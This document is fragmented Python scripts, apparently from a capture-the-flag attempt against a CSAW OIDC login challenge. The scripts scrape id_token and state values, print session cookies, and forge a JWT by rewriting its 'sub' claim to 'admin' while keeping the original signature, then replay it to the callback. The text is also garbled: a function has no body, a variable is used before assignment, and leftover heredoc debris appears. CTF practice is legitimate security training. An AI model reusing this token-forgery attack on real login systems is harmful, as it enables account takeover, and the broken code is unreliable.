import urllib.request, urllib.parse, http.cookiejar, re, html as H, sys, json, base64
base="http://trustdinoidc.chal.csaw.io:8990"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def get(u, hdrs=None):

body,code,hdrs=post(base+"/oauth/callback", {"id_token":tok, "state":state})
print("status", code, "loc", hdrs.get('Location'))

EOF

import urllib.request, urllib.parse, http.cookiejar, re, html as H
base="http://trustdinoidc.chal.csaw.io:8990"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def get(u):
    r=op.open(u); return r.read().decode(), r.status, dict(r.headers)
def post(u, data):
    d=urllib.parse.urlencode(data).encode()
    req=urllib.request.Request(u, data=d, headers={'Content-Type':'application/x-www-form-urlencoded'})
    r=op.open(req); return r.read().decode(), r.status, dict(r.headers)
h,_,_=get(base+"/")
u=[H.unescape(x) for x in re.findall(r'href="([^"]*authorize[^"]*)"', h)][0]
h2,_,_=get(u)
tok=re.search(r'name="id_token" value="([^"]+)"', h2).group(1)
state=re.search(r'name="state" value="([^"]*)"', h2).group(1)
post(base+"/oauth/callback", {"id_token":tok,"state":state})
for c in cj:
    print("COOKIE", c.name, "=", c.value[:200], "... len", len(c.value))
EOF"}

import urllib.request, urllib.parse, http.cookiejar, re, html as H, base64, json
base="http://trustdinoidc.chal.csaw.io:8990"
op=urllib.request.build_opener()
def get(u):
    r=op.open(u); return r.read().decode()
def post(u, data):
    d=urllib.parse.urlencode(data).encode()
    req=urllib.request.Request(u, data=d, headers={'Content-Type':'application/x-www-form-urlencoded'})
    try:
        r=op.open(req); return r.read().decode(), r.status
    except urllib.error.HTTPError as e:
        return e.read().decode(), e.code

def b64d(s): return base64.urlsafe_b64decode(s+'='*(-len(s)%4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

h=get(base+"/idp/paleoid/authorize?client_id=trustdinoidc-portal&redirect_uri=http%3A%2F%2Ftrustdinoidc.chal.csaw.io%3A8990%2Foauth%2Fcallback&scope=openid+profile+freeosaurus%3Aredeem&state=x")

state=re.search(r'name="state" value="([^"]*)"', h).group(1)
hdr,pay,sig=tok.split('.')
# tamper
p=json.loads(b64d(pay)); p['sub']='admin'
tampered=hdr+'.'+b64e(json.dumps(p).encode())+'.'+sig

print("---")

print("---")
print("wrongstate:", post(base+"/oauth/callback", {"id_token":tok,"state":"bogus"})[0][:400])
EOF"}
